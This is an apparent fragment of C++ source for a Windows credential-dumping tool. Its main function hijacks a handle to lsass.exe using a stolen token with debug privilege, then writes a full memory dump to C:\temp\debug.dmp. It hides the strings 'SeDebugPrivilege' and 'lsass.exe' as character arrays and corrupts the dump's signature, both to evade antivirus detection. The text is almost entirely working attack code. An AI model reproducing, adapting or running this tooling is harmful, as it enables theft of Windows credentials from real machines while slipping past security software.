    PSS_CAPTURE_FLAGS flags = PSS_CAPTURE_VA_CLONE | PSS_CAPTURE_HANDLES | PSS_CAPTURE_HANDLE_NAME_INFORMATION | PSS_CAPTURE_HANDLE_BASIC_INFORMATION | PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION | PSS_CAPTURE_HANDLE_TRACE | PSS_CAPTURE_THREADS | PSS_CAPTURE_THREAD_CONTEXT | PSS_CAPTURE_THREAD_CONTEXT_EXTENDED | PSS_CREATE_BREAKAWAY | PSS_CREATE_BREAKAWAY_OPTIONAL | PSS_CREATE_USE_VM_ALLOCATIONS | PSS_CREATE_RELEASE_SECTION;

    PssCaptureSnapshot(hProcess, flags, CONTEXT_ALL, (HPSS*)&hSnapshot);
    isDumped = miniDumpWriteDump(hSnapshot, 0, NULL, MiniDumpWithFullMemory, NULL, NULL, &CallbackInfo);
    PssFreeSnapshot(NtCurrentProcess(), (HPSS)hSnapshot);

    if (isDumped) {
        GenerateInvalidSignature(dumpBuffer);
        LPCWSTR filePath = L"C:\\temp\\debug.dmp";
        DWORD fileAttributes = GetFileAttributesW(L"C:\\temp");
        if (fileAttributes == INVALID_FILE_ATTRIBUTES) {
            if (!CreateDirectoryW(L"C:\\temp", NULL)) {
                printf("Create C:\\temp first\n");
                return 1;
            }
        }
        HANDLE hFile = CreateFile(filePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        DWORD bytesWritten = 0;
        BOOL writeSuccess = WriteFile(hFile, dumpBuffer, bytesRead, &bytesWritten, NULL);
        CloseHandle(hFile);

        RtlSecureZeroMemory(dumpBuffer, dumpBufferSize);
        HeapFree(GetProcessHeap(), 0, dumpBuffer);

        wprintf(L"Run `restoresig.py` on %s\n", filePath);

    }
    else wprintf(L"Failed, %s", GetLastErrorMessage().c_str());

    return isDumped;
}

int main() {
    if (!YouMustBeThisTallToRide()) {
        printf("Not Admin");
        exit(11);
    }

    printf("PID: %i\n", GetProcessId(NtCurrentProcess()));

    Gluttony();

    const wchar_t PgbDeS[] = { L'S', L'e', L'D', L'e', L'b', L'u', L'g', L'P', L'r', L'i', L'v', L'i', L'l', L'e', L'g', L'e', L'\0' };
    LUID luid = { 0,0 };
    LookupPrivilegeValueW(NULL, PgbDeS, &luid);
    
    ParseEAT();

    const char elsauce[] = { 'l', 's', 'a', 's', 's', '.', 'e', 'x', 'e', '\0' };

    HANDLE hToken = nullptr;
    HANDLE hProcess = nullptr;

    hToken = FindersKeepers(luid);
    if (GetPromoted(hToken)) {
        hProcess = HijackHandle(elsauce);
        InvokeMiniDump(hProcess);
        GetDemoted();
    }
    
    if (hToken) CloseHandle(hToken);
    if (hProcess) CloseHandle(hProcess);

    system("pause");
    return 0;
}
